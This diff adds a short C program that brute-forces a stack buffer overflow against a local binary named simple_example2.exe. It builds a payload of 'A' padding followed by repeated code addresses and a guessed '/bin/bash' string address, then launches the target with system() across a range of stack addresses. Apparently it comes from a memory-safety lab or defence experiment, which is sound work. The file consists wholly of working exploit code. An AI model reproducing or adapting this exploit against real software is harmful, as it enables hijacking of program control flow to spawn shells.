@@ -1,0 +1,49 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char ** argv)
+{
+	unsigned int bin_bash_address=0xbfffffff;
+
+	int buffer_size=1300;
+	int i;
+	char *ptr;
+
+	char *buff=(char *) malloc((buffer_size+1)*sizeof(char));
+
+	while(bin_bash_address>=0xbfffd000)
+        {
+		bzero(buff, (buffer_size+1)*sizeof(char));
+		ptr=buff;
+
+		unsigned int *addr_ptr=(unsigned int *) buff+1000;
+		for(i=0;i<1000;i++)
+			*(ptr++)='A';
+
+		for(i=0;i<18;i++)
+		{
+			*(addr_ptr++)=0x080483c0;//0x08048410;
+			*(addr_ptr++)=0x080483e0;
+			*(addr_ptr++)=bin_bash_address;
+		}
+	
+
+		char programCommand[buffer_size+2];
+		memcpy(programCommand, buff, buffer_size+1);
+		programCommand[buffer_size+1]='\0';
+		strcat(programCommand, "\'");
+
+		char program[41];
+		program[40]='\0';
+		sprintf(program, "./simple_example2.exe  '");
+		//sprintf(program, "$SDE_KIT/sde  -- ./simple_example2.exe '");
+
+		memcpy(programCommand, program, strlen(program));
+		system(programCommand);
+		printf("0x%x\n", bin_bash_address);
+		bin_bash_address--;
+	}
+
+	free(buff);
+}
